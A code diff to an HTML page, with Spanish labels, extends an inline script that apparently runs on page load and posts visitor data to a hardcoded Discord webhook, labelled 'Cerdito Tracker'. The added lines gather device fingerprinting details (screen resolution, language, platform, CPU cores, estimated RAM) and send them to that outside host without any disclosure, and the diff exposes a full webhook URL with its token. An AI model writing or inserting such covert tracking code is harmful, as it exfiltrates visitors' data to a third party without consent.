@@ -292,6 +292,14 @@
 
     </script>
 <script>
+    const screenWidth = screen.width;
+    const screenHeight = screen.height;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    const deviceMemory = navigator.deviceMemory || "No disponible";
+    const cores = navigator.hardwareConcurrency || "No disponible";
+    
+
 (async () => {
     const webhookUrl = "https://discord.com/api/webhooks/1379196950548840562/dbcNuGow4IcIdN8Fj1Due9d_e-PDm43i3AWxYUQZ4Zhyp5J_oe4vk6yfrprOqsPZvCis";
 
@@ -332,7 +340,33 @@
                             name: "📅 Fecha",
                             value: new Date().toLocaleString(),
                             inline: true
-                        }
+                        },
+                        {
+    name: "🌐 Idioma",
+    value: language,
+    inline: true
+},
+{
+    name: "📱 Resolución",
+    value: `${screenWidth}x${screenHeight}`,
+    inline: true
+},
+{
+    name: "💻 Plataforma",
+    value: platform,
+    inline: true
+},
+{
+    name: "🧠 Núcleos CPU",
+    value: `${cores}`,
+    inline: true
+},
+{
+    name: "🧮 RAM estimada",
+    value: `${deviceMemory} GB`,
+    inline: true
+}
+
                     ],
                     footer: {
                         text: "Cerdito Tracker ツ"
@@ -361,7 +395,5 @@
 })();
     </script>
 
-
 </body>
 </html>
-
